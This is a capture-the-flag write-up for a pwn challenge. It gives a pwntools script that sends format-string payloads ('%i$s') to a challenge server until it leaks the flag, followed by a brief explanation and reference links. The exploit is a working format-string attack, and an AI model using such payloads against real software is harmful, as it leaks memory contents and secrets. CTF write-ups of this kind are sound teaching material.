# I think we have a roof leak

> Category: Pwn
> 
> The printf function in expects one or more parameters. In the man page its defined as: int printf(const char *format, ...);
> 
> If the first (and only) argument is a pointer string without any formating options it just prints the string. But what happens if we only have one argument, that is user controlled?
> 
> The man page can be a good place to start.
> 
> nc io.ept.gg 30021

## Solution
```python
#!/usr/bin/python
from pwn import *

elf = context.binary = ELF('./pwn1')
host = 'io.ept.gg'
port = 30021

for i in range(10):
    r = remote(host, port)
    r.recvline()
    payload = f'%{i}$s'.encode()
    r.sendline(payload)
    flag = r.recvline().strip()
    if b'EPT' in flag:
        print(f'Payload "{payload.decode()}" - {flag.decode()}')
        r.close()
        break
    r.close()
```

This pwn uses the `Format string attack` and that `%[index]$[write_type]`. Using a for-loop to find the `index` and `%s` to print a string.

More or less, the python-scripts uses `pwntools` to read the elf-file and connect to the host. Then the scripts iterates through payloads to find the index containing the flag. When the flag - `EPT` - has been found, print the payload and the flag, then break the loop and exit.

## Links
Here are some resources regarding format string attacks:

https://owasp.org/www-community/attacks/Format_string_attack

https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b

https://tripoloski1337.github.io/ctf/2020/06/11/format-string-bug.html

